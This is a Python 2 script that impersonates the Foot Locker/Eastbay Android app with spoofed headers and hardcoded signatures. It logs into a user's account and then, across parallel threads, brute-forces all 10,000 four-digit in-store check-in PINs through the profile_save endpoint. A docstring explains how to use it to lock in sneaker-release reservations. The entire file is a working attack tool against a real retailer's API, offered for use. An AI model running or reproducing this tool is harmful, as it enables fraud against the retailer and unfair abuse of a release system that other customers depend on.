import requests
import json
import threading
import hashlib


class brute:
    def __init__(self, username, password):
        self.loggedIn = False
        self.authkey = None
        self.jwt = None
        self.custId = None
        self.user_id = None
        self.session_id = None
        self.user_pwd = None
        self.session = requests.session()
        self.session.headers = {
            'Host': 'pciis02.eastbay.com',
            'Content-Type': 'application/json',#'application/binary',
            'X-GPS-Signature' : 'Ab5PGHqXyC7AIxt4Nbn/AAGH5VBsTv5M6gxPYElr+zI=',
            'X-NewRelic-ID': 'VQMOWFZQGwsGVFBbBgI=',
            'Connection': 'keep-alive',
            'Accept': 'application/json',
            'Accept-Language': 'en-gb',
            'Accept-Encoding': 'gzip, deflate',
            'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; HUAWEI TIT-TL00 Build/KOT49H)'}
        self.username = username
        # password needs to be sent as md5
        m = hashlib.md5()
        m.update(password)
        self.password = m.hexdigest()
        if self.login():
            self.loggedIn = True

    def login(self):
        """
        So it's been adjusted for blue tints - literally just tried it and it works. First sign up for your 3 stores, pick you size and lock it in. Then run this program on the account, when its done (it will tell you when). Log out and back in. Have fun
        :return:
        """
        endpoint = 'https://pciis02.eastbay.com/API/v3/Customers/WebAccount/Authenticate/'
        payload = {
            "email": self.username,
            "password": self.password,
            "needsAuthKey": "true",
            "companyId": "21",
            "vipStoreNumber": "25273"}
        r = self.session.post(endpoint, data=json.dumps(payload))
        print r.text
        if r.status_code == 200:
            print 'Login success'
        else:
            print 'Login error'
            return False
        self.authkey = r.json()['authKey']
        self.jwt = r.json()['JWT']
        self.custId = r.json()['webCustomerId']
        payload = '[{"platform_id":10,"release_id":4600,"packet_type":9,"subpacket_type":1,"encrypted":"true","os_version":"4.4.2","latitude":-33.8688183,"longitude":151.20929,"app_version":"2.8.0","sdk_version":"4.6.1","dev_key":"wRcbEq7gD46s43QL1pPMt3HC","clienttype_id":239,"dev_name":"Foot Locker","device_id":"5af786d1-5984-40f0-95db-6961e2a7fb8c"},{"email":"%s","zipcode":"USEGPS","request_type":"register"}]' % self.custId
        #payload = json.dumps(payload)
        self.session.headers={'Host' : 'footlocker.gpshopper.com',
                              'User-Agent' : 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; HUAWEI TIT-TL00 Build/KOT49H)',
                              'Accept-Encoding' : 'gzip, deflate',
                              'Connection' : 'keep-alive',
                              'Accept': '*/*',
                              'X-GPS-Signature' : 'oLox0hVAUOiU9sxExZx2tzMvMUiAkX2VKQ+eUxUUpS0=',
                              'Content-Type' : 'application/binary'}
        r = self.session.post('https://footlocker.gpshopper.com/mobile', data=payload)
        if r.status_code == 200:
            print 'Register success'
        else:
            print 'Register error'
            return False
        self.user_id = r.json()[0]['user_id']
        self.session_id = r.json()[0]['session_id']
        self.user_pwd = r.json()[0]['password']
        return True

    def bruteForce(self):
        print 'Starting bruteforce'
        keys = []
        threads = []
        for a in range(0, 10):
            for b in range(0, 10):
                for c in range(0, 10):
                    for d in range(0, 10):
                        keys.append(int("%s" % a + "%s" % b + "%s" % c + "%s" % d))
        chunks = [keys[x:x + 100] for x in xrange(0, len(keys), 100)]
        for chunk in chunks:
            t = threading.Thread(target=self.go, args=[chunk])
            threads.append(t)
        for t in threads:
            t.start()

    def go(self, lst):
        if not self.loggedIn:
            print 'Not authenticated'
            return
        print 'Task is running bruteforce (THIS COULD TAKE A WHILE BE PATIENT)'
        for key in lst:
            payload = [
                {"dev_key": "wRcbEq7gD46s43QL1pPMt3HC", "app_version": "2.6.1", "longitude": "", "clienttype_id": 239,
                 "latitude": "", "sdk_version": "3.0", "release_id": 2503, "subpacket_type": 1,
                 "dev_name": "Foot Locker", "locationServices": "ON", "beacon_optin": "YES",
                 "vip_status": "Regular VIP", "platform_id": 9, "device_id": "", "refsrc": "", "os_version": "10.2",
                 "packet_type": 9, "notification_optin": "YES"}, {"request_type": "profile_save",
                                                                  "supplemental_data": {"vip_status": "Regular VIP",
                                                                                        "store_checkin_pin": str(key)}}]
            payload = json.dumps(payload)
            r = self.session.post('https://footlocker.gpshopper.com/mobile/239/9/2503/profile_save', data=payload)
            if not r.status_code == 200:
                print r.text
                print str(key) + ' failed [%s' % r.status_code + ']'
        print 'Thread: Done (LOG OUT AND BACK INTO YOUR ACCOUNT)'


username = raw_input("Username: ")
password = raw_input("Password: ")
b = brute(username, password)
b.bruteForce()
